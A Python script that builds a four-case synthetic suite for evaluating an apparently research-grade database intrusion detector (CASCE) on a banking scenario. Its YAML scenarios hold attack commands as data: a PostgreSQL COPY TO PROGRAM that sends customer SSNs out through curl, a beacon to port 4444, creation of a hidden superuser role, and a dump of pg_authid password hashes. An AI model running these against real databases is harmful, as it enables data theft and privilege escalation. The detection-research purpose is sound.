#!/usr/bin/env python3
"""Create a four-case paper-ready suite for CASCE.

Each case occupies its own folder under individual_simulation/paper_4case_suite/
with a scenario file, generated logs, graph artifact, and algorithm-4 detection
output. This is a lightweight reproducible setup for paper inclusion.
"""

from __future__ import annotations

import json
import shutil
import subprocess
import sys
from pathlib import Path

import networkx as nx
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

REPO = Path(__file__).resolve().parent.parent
ROOT = REPO / "individual_simulation"
SUITE = ROOT / "paper_4case_suite"

SPEC_MAP = {
    "case_01_seen_benign": """
scenario_id: banking_exfil_seen_benign
family_id: banking_exfil_seen
domain: banking
time_of_day: "02:30"
default_class: benign
rule_engine_relationship: agrees
sessions:
  - session_label: exfil
    role: postgres
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [5.0]
    events:
      - step_id: prep
        process: {comm: gzip, args: [staging.csv]}
      - step_id: drop_file
        file: {path: /tmp/staging.csv, syscall: unlink, parent: prep}
      - step_id: beacon
        connect: {ip: "45.33.12.9", port: 4444, parent: prep}
      - step_id: exfil
        sql: "COPY (SELECT name FROM products WHERE product_id = 4471) TO PROGRAM 'curl -sX POST https://partner-api.example/sync -d @-'"
        connects_to: {ip: "93.184.216.34", port: 443}
""".strip(),
    "case_02_seen_malicious": """
scenario_id: banking_exfil_seen_malicious
family_id: banking_exfil_seen
domain: banking
time_of_day: "02:30"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: exfil
    role: postgres
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [5.0]
    events:
      - step_id: prep
        process: {comm: gzip, args: [staging.csv]}
      - step_id: drop_file
        file: {path: /tmp/staging.csv, syscall: unlink, parent: prep}
      - step_id: beacon
        connect: {ip: "45.33.12.9", port: 4444, parent: prep}
      - step_id: exfil
        sql: "COPY (SELECT ssn FROM customers WHERE customer_id = 4471) TO PROGRAM 'curl -sX POST https://partner-api.example/sync -d @-'"
        connects_to: {ip: "93.184.216.34", port: 443}
""".strip(),
    "case_03_unseen_benign": """
scenario_id: banking_priv_escalation_unseen_benign
family_id: banking_priv_escalation_unseen
domain: banking
time_of_day: "03:10"
default_class: benign
rule_engine_relationship: agrees
sessions:
  - session_label: privilege_check
    role: postgres
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [3.0]
    events:
      - step_id: prep
        process: {comm: bash, args: ["-lc", "echo auth-check >> /tmp/priv_audit.log"]}
      - step_id: read_roles
        sql: "SELECT rolname FROM pg_roles WHERE rolname = 'analyst_readonly';"
      - step_id: grant_check
        sql: "GRANT SELECT ON customers TO analyst_readonly;"
      - step_id: cleanup
        file: {path: "/tmp/priv_audit.log", syscall: unlink, parent: prep}
""".strip(),
    "case_04_unseen_malicious": """
scenario_id: banking_priv_escalation_unseen_malicious
family_id: banking_priv_escalation_unseen
domain: banking
time_of_day: "03:10"
default_class: malicious
rule_engine_relationship: malicious_false_negative
sessions:
  - session_label: privilege_check
    role: postgres
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [3.0]
    events:
      - step_id: prep
        process: {comm: bash, args: ["-lc", "echo escalate >> /tmp/priv_shadow.log"]}
      - step_id: create_role
        sql: "CREATE ROLE svc_shadow SUPERUSER LOGIN PASSWORD 'TempPass!';"
      - step_id: dump_auth
        sql: "SELECT rolname, rolpassword FROM pg_authid;"
      - step_id: grant_access
        sql: "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO svc_shadow;"
      - step_id: cleanup
        file: {path: "/tmp/priv_shadow.log", syscall: unlink, parent: prep}
""".strip(),
}


def run_cmd(cmd: list[str], cwd: Path) -> None:
    print(f"[run] {' '.join(cmd)}")
    subprocess.run(cmd, cwd=str(cwd), check=True)


def write_summary(case_dir: Path, step: str, payload: dict) -> None:
    out = case_dir / step / "summary.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(payload, indent=2))


def main() -> None:
    SUITE.mkdir(parents=True, exist_ok=True)
    case_ids = [
        "case_01_seen_benign",
        "case_02_seen_malicious",
        "case_03_unseen_benign",
        "case_04_unseen_malicious",
    ]

    # Reset suite content to keep the paper output clean.
    for p in SUITE.iterdir():
        if p.is_dir():
            shutil.rmtree(p)

    for case_id in case_ids:
        case_dir = SUITE / case_id
        case_dir.mkdir(parents=True, exist_ok=True)
        specs_dir = case_dir / "specs"
        specs_dir.mkdir(parents=True, exist_ok=True)
        (specs_dir / "scenario.yaml").write_text(SPEC_MAP[case_id])

        # Stage 1: generate raw SQL/OS logs from the YAML spec.
        run_cmd([sys.executable, "datagen/codegen.py", str(case_dir)], REPO)
        run_cmd([sys.executable, "datagen/validate_run.py", str(case_dir)], REPO)

        # Save Algorithm 1 inputs/outputs.
        algo1_dir = case_dir / "algo1"
        algo1_dir.mkdir(parents=True, exist_ok=True)
        for name in ["postgres_events.json", "kernel_events.json", "labels.csv", "expectation_manifest.json", "validation_report.json"]:
            src = case_dir / name
            if src.exists():
                shutil.copy2(src, algo1_dir / name)

        # Stage 2-4: build enriched graph and run model.
        run_cmd([sys.executable, "main.py", str(case_dir)], REPO)

        # Locate generated GraphML file(s) for the case.
        graph_dirs = [ROOT / "enriched_graphs" / "graphml", SUITE / "enriched_graphs" / "graphml"]
        graph_files = []
        for graph_dir in graph_dirs:
            graph_files = sorted(graph_dir.glob(f"enriched_{case_id}_*.graphml"))
            if graph_files:
                break
            graph_files = sorted(graph_dir.glob(f"enriched_*_{case_id}_*.graphml"))
            if graph_files:
                break
        if not graph_files:
            raise FileNotFoundError(f"No GraphML generated for {case_id} in {graph_dirs}")

        algo3_dir = case_dir / "algo3"
        algo3_dir.mkdir(parents=True, exist_ok=True)
        for gf in graph_files:
            shutil.copy2(gf, algo3_dir / gf.name)

        # Save Algorithm 2 summary by reusing the graph file as the base output.
        algo2_dir = case_dir / "algo2"
        algo2_dir.mkdir(parents=True, exist_ok=True)
        summary = {
            "case_id": case_id,
            "graph_files": [g.name for g in graph_files],
            "num_graphs": len(graph_files),
            "note": "Graph built from correlated SQL+OS events and enriched with behavior nodes.",
        }
        (algo2_dir / "graph_manifest.json").write_text(json.dumps(summary, indent=2))

        # Import the improved render_graph from generate_case_catalog.
        from generate_case_catalog import render_graph as _render_graph

        for graph_file in graph_files:
            out_png = case_dir / "graph.png"
            _render_graph(graph_file, out_png, title=case_id)
            break

        algo4_dir = case_dir / "algo4"
        algo4_dir.mkdir(parents=True, exist_ok=True)
        run_cmd([
            sys.executable,
            "algorithm_4_hybrid.py",
            "--mode",
            "detect",
            "--input-dir",
            str(algo3_dir),
            "--model-path",
            "casce_gat_v3p.pt",
            "--outdir",
            str(algo4_dir),
        ], REPO)

        # Keep a compact per-case summary.
        expected_label = "benign" if "benign" in case_id else "malicious"
        for out in sorted(algo4_dir.glob("*_assessment.json")):
            payload = json.loads(out.read_text())
            payload["expected_label"] = expected_label
            out.write_text(json.dumps(payload, indent=2))

        summary_out = {
            "case_id": case_id,
            "expected_label": expected_label,
            "algorithms": [
                "algo1: generated postgres + kernel logs",
                "algo2: session correlation and graph construction",
                "algo3: behavior-enriched graph export",
                "algo4: pretrained CASCE model detection",
            ],
            "graph_files": [g.name for g in graph_files],
        }
        (case_dir / "case_summary.json").write_text(json.dumps(summary_out, indent=2))

        print(f"[OK] created {case_dir}")

    # Save a root summary for the paper folder.
    root_summary = {
        "suite_name": "paper_4case_suite",
        "cases": [
            {
                "id": c,
                "kind": "seen_benign" if "seen_benign" in c else "seen_malicious" if "seen_malicious" in c else "unseen_benign" if "unseen_benign" in c else "unseen_malicious",
            }
            for c in case_ids
        ],
    }
    (SUITE / "README.md").write_text(
        "# Paper-ready 4-case validation suite\n\n"
        "Generated by individual_simulation/create_paper_case_suite.py.\n\n"
        "Each subfolder contains the result of Algorithms 1–4 for a single synthetic scenario.\n"
        "- seen_benign / seen_malicious: exfiltration scenarios matched to training behavior\n"
        "- unseen_benign / unseen_malicious: privilege-escalation style scenarios not seen in training\n"
    )
    (SUITE / "summary.json").write_text(json.dumps(root_summary, indent=2))


if __name__ == "__main__":
    main()
